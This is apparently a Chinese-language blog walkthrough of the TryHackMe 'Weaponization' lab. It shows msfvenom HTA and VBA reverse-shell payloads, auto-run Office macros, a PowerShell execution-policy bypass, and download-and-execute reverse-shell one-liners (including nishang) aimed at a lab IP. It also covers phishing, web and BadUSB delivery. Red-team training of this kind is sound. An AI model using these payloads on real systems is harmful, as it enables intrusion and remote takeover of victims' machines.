
# Weaponization

了解并探索常见的红队武器化技术。您将学习如何使用业内常见的方法来构建自定义有效负载，以获得初始访问权限。

## 什么是武器化

武器化是网络杀伤链模式的第二阶段。在此阶段，攻击者使用可交付的有效负载（如word文档，PDF等）生成和开发自己的恶意代码[1]。武器化阶段旨在使用恶意武器来利用目标机器并获得初始访问权限。

大多数组织都运行Windows操作系统，这将是一个可能的目标。组织的环境策略通常会阻止下载和执行.exe以避免安全违规。因此，红队成员依赖于构建通过各种渠道（例如网络钓鱼活动、社交工程、浏览器或软件利用、USB 或 Web 方法）发送的自定义有效负载。

大多数组织在其受控环境中阻止或监视.exe文件的执行。出于这个原因，红队依赖于使用其他技术（例如内置的窗口脚本技术）执行有效负载。

## Windows Scripting Host

Windows 脚本主机是一个内置的 Windows 管理工具，可运行批处理文件以自动执行和管理操作系统中的任务。

它是一个Windows原生引擎，cscript.exe（用于命令行脚本）和wscript.exe（用于UI脚本），负责执行各种Microsoft Visual Basic Script（VBScript），包括vbs和vbe。需要注意的是，Windows 操作系统上的 VBScript 引擎以与普通用户相同的访问和权限级别运行和执行应用程序;因此，它对红队员很有用。

另一个技巧。如果 VBS 文件被列入黑名单，那么我们可以将文件重命名为.txt文件并使用 wscript 运行它，如下所示，

```cmd
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

结果将与执行运行 calc.exe 二进制文件的 vbs 文件一样精确。

## An HTML Application（HTA）

### An HTML Application （HTA）

HTA 代表“HTML 应用程序”。它允许您创建一个可下载的文件，该文件获取有关其显示和呈现方式的所有信息。 HTML 应用程序，也称为 HTA，它们是包含 JScript 和 VBScript 的动态 HTML 页面。LOLBINS（土地生活二进制文件）工具mshta用于执行HTA文件。它可以单独执行，也可以从Internet Explorer自动执行。

在下面的示例中，我们将在有效负载中使用JavaScript ActiveXObject 作为执行 cmd.exe 的概念证明。请考虑以下 HTML 代码。

```html
<html>
<body>
<script>

    new ActiveXObject('WScript.shell').Run('cmd');

</script>
</body>
</html>
```

### HTA反向连接

我们可以创建一个反向外壳有效载荷，如下所示，

    msfvenom -p windows/x64/shell_reverse_tcp lhost=10.14.39.48 lport=443 -f hta-psh -o ./rev_she11.hta

## Visual Basic for Application （VBA）

VBA代表Visual Basic for Applications，这是Microsoft为Microsoft Word，Excel，PowerPoint等Microsoft应用程序实现的编程语言。VBA 编程允许自动执行用户和 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。

宏是 Microsoft Office 应用程序，其中包含用称为 Visual Basic for Applications （VBA） 的编程语言编写的嵌入式代码。它用于创建自定义函数，通过创建自动化流程来加快手动任务的速度。VBA的功能之一是访问Windows应用程序编程接口（API）和其他低级功能。

### 让我们开始

现在从“开始”菜单打开Microsoft Word 2016

在宏名称部分中，我们选择将宏命名为 THM。请注意，我们需要从列表 Document1 中的宏中进行选择，最后选择创建。接下来，Microsoft Visual Basic for Application 编辑器显示了我们可以在哪里编写 VBA 代码。让我们尝试显示一个消息框，其中包含以下消息：欢迎来到武器化室！.我们可以使用 MsgBox 函数执行此操作，如下所示：

```vbnet
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

最后，按 F5 运行宏或运行→运行子/用户窗体。

现在，为了在打开文档后自动执行VBA代码，我们可以使用内置功能，例如AutoOpen和Document_open。请注意，我们需要指定文档打开后需要运行的函数名称，在本例中为 THM 函数。

```vbnet
Sub Document_open()
hack (a)
End Sub

Sub AutoOpen()
hack (a)
End Sub

Sub hack(a)
'
' hack Macro
'
'
    MsgBox ("hack" + a)
End Sub
```

重要的是要注意，要使宏工作，我们需要将其保存为启用宏的格式，例如.doc和docm。docx也可以

打开它

![在这里插入图片描述](https://img-blog.csdnimg.cn/42ee694127a64fa29f2df5fe32116aa5.png)

```vbnet
CreateObject("Wscript.Shell").Run ("calc")
```

### Reverse shell

	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.14.39.48 lport=8888 -f vba

将shellcode复制到macros

导入以注意需要进行一次修改才能完成此操作。输出将在 MS Excel 工作表上工作。因此，将Workbook_Open（）更改为Document_Open（）以使其适用于MS Word文档。

metasploit开启监听，打开该文档，将获得反向shell

## PowerShell （PSH）

红队成员依靠 PowerShell 来执行各种活动，包括初始访问、系统枚举和许多其他活动。让我们从创建一个简单的PowerShell脚本开始，该脚本打印”欢迎来到武器化室！“如下

```powershell
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop>
```

### 执行政策

PowerShell 的执行策略是一种安全选项，用于保护系统免受恶意脚本的运行。默认情况下，出于安全目的，Microsoft 禁用执行 PowerShell 脚本 .ps1。PowerShell 执行策略设置为“Restricted”，这意味着它允许单个命令，但不运行任何脚本。

您可以确定 Windows 的当前 PowerShell 设置，如下所示：

![在这里插入图片描述](https://img-blog.csdnimg.cn/4bfddb423dc14a1c8a724e7ca6dc29e9.png)

我们还可以通过在cmd运行以下命令轻松更改 PowerShell 执行策略：

	Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

![在这里插入图片描述](https://img-blog.csdnimg.cn/bda7b51bdf50498aaa00af63f5fcc29d.png)

### 绕过执行策略

微软提供了禁用此限制的方法。其中一种方法是向 PowerShell 命令提供参数选项，以将其更改为所需的设置。例如，我们可以将其更改为绕过策略，这意味着不会阻止或限制任何内容。这很有用，因为这让我们可以运行自己的PowerShell脚本。

	powershell -ep bypass

### Reverse shell

	powershell -nop -c "iex (New-Object System.Net.WebClient).DownloadString('http://10.14.39.48:8000/reverse_shell.ps1');"

#### nishang

使用[nishang](https://github.com/samratashok/nishang)网络下载脚本并在内存直接加载

	powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]

#### metasploit

	exploit/multi/script/web_delivery

使用该模块生成payload

## 交付技术

### 电子邮件传递

这是一种常用方法，用于通过发送带有链接或附件的网络钓鱼电子邮件来发送有效负载。有关更多信息，请访问此处。此方法附加一个恶意文件，该文件可能是我们前面提到的类型。目标是说服受害者访问恶意网站或下载并运行恶意文件以获得对受害者网络或主机的初始访问权限。

红队成员应该有自己的用于网络钓鱼目的的基础设施。根据红队参与要求，它需要在电子邮件服务器中设置各种选项，包括域名密钥识别邮件 （DKIM）、发件人策略框架 （SPF） 和 DNS 指针 （PTR） 记录。

红队成员还可以使用第三方电子邮件服务，如Google Gmail，Outlook，Yahoo和其他声誉良好的服务。

另一种有趣的方法是使用公司内受损的电子邮件帐户在公司内部或向其他人发送网络钓鱼电子邮件。受感染的电子邮件可能会被网络钓鱼或其他技术（如密码喷射攻击）入侵。

### Web交付

另一种方法是在由红队员控制的 Web 服务器上托管恶意负载。Web 服务器必须遵循安全准则，例如其域名的干净记录和信誉以及 TLS（传输层安全性）证书。有关更多信息，请访问此处。

此方法包括其他技术，例如对受害者进行社会工程访问或下载恶意文件。使用此方法时，URL 缩短器可能会有所帮助。

### USB交付

此方法要求受害者物理插入恶意USB。此方法在对手可以分发 USB 的会议或活动中可能有效且有用。有关 USB 传输的更多信息，请访问此处。

通常，组织会建立强大的策略，例如出于安全目的在其组织环境中禁用 USB 使用。而其他组织允许在目标环境中使用它。

**我对usb交付比较感兴趣，因此我去了解到了badusb的东西，我在淘宝购买了硬件，在[github](https://github.com/wangwei39120157028/BadUSB)找到了大佬们的资源**

**等购买的开发板到货之后我要尝试一下，并分享一下过程**

![在这里插入图片描述](https://img-blog.csdnimg.cn/af2d5e4a452441b08a12f89cf84fdb2f.png)

## 练习场

我们准备了一台 Windows 10 计算机，该计算机运行用户模拟 Web 应用来执行有效负载或自动访问恶意 HTA 链接。

![在这里插入图片描述](https://img-blog.csdnimg.cn/b7b02ed973e34ef2958e0cfd2568a166.png)

### HTA

题目只能通过web传递hta，所以我们这里使用metasploit的hta_server

![在这里插入图片描述](https://img-blog.csdnimg.cn/70a1d7ff2acb41fd905f3796d6c2b820.png)

将url丢到靶机，就能上线

![在这里插入图片描述](https://img-blog.csdnimg.cn/44415561a4df4af78da43c9711197872.png)

VBA、PSH就不演示了，与上面的教程一致

[TryHackMe](https://tryhackme.com/room/weaponization)
